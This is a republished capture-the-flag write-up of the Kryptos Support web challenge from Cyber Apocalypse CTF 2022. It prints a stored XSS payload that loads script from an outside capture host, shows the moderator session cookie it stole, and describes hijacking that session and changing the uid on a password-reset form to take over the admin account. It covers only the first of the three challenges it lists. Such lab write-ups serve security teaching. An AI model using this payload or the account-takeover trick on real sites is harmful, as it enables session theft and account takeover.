# :game_die: Cyber Apocalypse CTF 2022 - Intergalactic Chase Write up

> **Original Source:** [Cyber Apocalypse CTF 2022 - Intergalactic Chase Write up](https://infosecwriteups.com/cyber-apocalypse-ctf-2022-intergalactic-chase-write-up-6d2e89b1633e)
> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2022

---

# Cyber Apocalypse CTF 2022 — Intergalactic Chase Write up


*[https://ctf.hackthebox.com/static/ca/cyber_apocalypse_2022_ca.jpg](https://ctf.hackthebox.com/static/ca/cyber_apocalypse_2022_ca.jpg)*


Hello everyone I am **Hac** and today we are doing Cyber Apocalypse CTF 2022 , Specifically these challenges :-


```
**- Kryptos Support (Web)
- BlinkerFluids (web)
- Compressor (Misc)**
```


We will first start with **Kryptos Support (Web) . **Let’ s go** ………**


On visiting the page , We see that there is and input field where we can give some input after that it’s checked by the admin (it’s like a reporting system where our report will be checked by the admin user or some other group of user ) .


I was wondering what I can do with this , I have played good amount of CTF’s (still a noob) So I thought to try XSS but not your traditional alert(1) , Since things are not happening at our side we need to know whether our payload is working or not . That’s why I am using [XSShunter](https://xsshunter.com/) there are other-ways to do this work but I will stick with [XSShunter](https://xsshunter.com/) . This is our payload 🢃


```
"><script src=[https://](https://hac10101.xss.ht)someone-in-somewhere-redacted.com></script>
```


And boom our XSS payload fired I was wondering what I can do from here ? One thing was really interesting for me we are able to get cookie . Which could be of admin or some other user with same or slightly lower privilege .


Since we don't have any cookie at our side that’s why cookie was interesting to me .


```
##### Cookies (Non-HTTPOnly)
`session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI`
```


Now we can add that cookie in our browser .


*adding cookie*


After that we will navigate to /tickets (Thanks to my amazing team member [KDirectorate](https://twitter.com/KDirectorate)) .


I was wondering what i can do here the page seems to be static (except few stuff) . I tried /rfid/somenumbers and all but no luck


Then one of my team mate ([KDirectorate](https://twitter.com/KDirectorate)) said to “check /setting which has password reset functionality ” which was really interesting . I navigated to /setting and intercepted the response in burp suite .


There was the filed one was “password” and othere was “uid” (which was like username ) .


Then I thought what if I change to value of **uid** with 1 ? ( Most of the time 1=admin)


And boom I was able to change password of admin . After that I tried to login as admin and I was successful .

---

*Originally published on [Medium](https://infosecwriteups.com/cyber-apocalypse-ctf-2022-intergalactic-chase-write-up-6d2e89b1633e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
